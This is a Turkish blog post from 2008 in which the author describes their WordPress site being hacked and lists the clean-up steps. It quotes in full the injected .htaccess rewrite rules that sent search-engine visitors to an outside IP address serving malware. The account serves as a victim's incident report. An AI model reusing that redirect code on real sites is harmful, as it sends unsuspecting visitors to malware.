---
layout: post
title: Hacklendik
Date: 2008-11-18 22:15
categories: [Haberler]
tags: [apache, ftp, google, hack, htaccess, malware, WordPress]
---

Bu gün siteme girmeye çalışan Firefox ve Google üzerinden girmeye
çalışanların karşılaştığı bir sorun sitem zararlı içerik olduğu için
engellenmiş. Aslında tüm arama sitelerinden gelen yönlendirmeler de aynı
sorun varmış. En sonunda anladım. Uzun aramalar sonunda
[http://wordpress.org/support/topic/217700][] Bu linkdeki bilgiler
doğrultusunda htcaacces içine girilen yönlendirme kodu nedeni ile
yaşamışım bu sorunları. Ayrıca yazılarımın için yerleştirilmiş bir
iframe reklam linkeleri de var tabi. Yukarıdaki linkdeki işlemleri tek
tek yaptım - htaccess dosyasını sildim. - ftp şifremi değiştirdim -
hostingh firmamdan sitemin bulnduğu klasörü bir virüs, malware
taramasından geçirmelerini istedim. Sorunun ana nedeni htaccess
dosyasında ki kodlar olarak görünüyor. Başta uzunca bir boşluktan sonra
aşağıdaki kod yazıyordu.

RewriteEngine On RewriteCond %{HTTP_REFERER} .*google.*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*aol.*$ [NC,OR]
RewriteCond %{HTTP_REFERER} .*msn.*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*altavista.*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*ask.*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*yahoo.*$ [NC]
RewriteRule .* http://89.28.13.202/in.html?s=ix [R,L]

Bu arada cute ftp'de htaccess görüntülemeyide öğrendik.
[http://blog.youontop.com/server-issues/view-htaccess-hidden-files-in-cuteftp-38.html][]
Muhtemelen sorun haftasonu benim kalıcı bağlantılarım gittinde oldu ve
ben bunu anlamadım. Asıl sorunun ise sitemi yahoo.com'da aradığımda
karşılaştım, linke tıkladığımda bilgisayarıma zararlı yazılım eklemeye
çalıştı. Zaten yukarıdaki kodda da bu açıkça görülüyor, siteme direk
girişlerde değilde arama sonuçlarından gelince yüklenmeye çalışıyor. Ama
hesap edemedikleri şey google'un bunu görüp sitemi kapatması. Google'un
ve Firefox'un sitemi engellemeleri daha bitmedi. Google Web Yöneticis
aracındaki incelemeye alın işaret kutunu işaretledim ve
StopBadware.org'daki formuda doldurdum. Neyse hayırlısı bakalım. Bu
durumu gören ve beni uyaran tüm arkadaşlara teşekkürler. Umarım bu tip
sorunlarla bi daha karşılaşmayız.

## Ek olarak

Ayrıca http://fatihhayrioglu.com/?ref=siteAdi gibi linkler var.
Bunlarıda robots.txt User-agent: * Disallow: /*ref=* Disallow:
/*?ref= kodlarını ekleyerek düzelttim. İşin ilginci bu linkleri
google'un arama aracı nasıl buluyor.

  [http://wordpress.org/support/topic/217700]: http://wordpress.org/support/topic/217700
  [http://blog.youontop.com/server-issues/view-htaccess-hidden-files-in-cuteftp-38.html]: http://blog.youontop.com/server-issues/view-htaccess-hidden-files-in-cuteftp-38.html
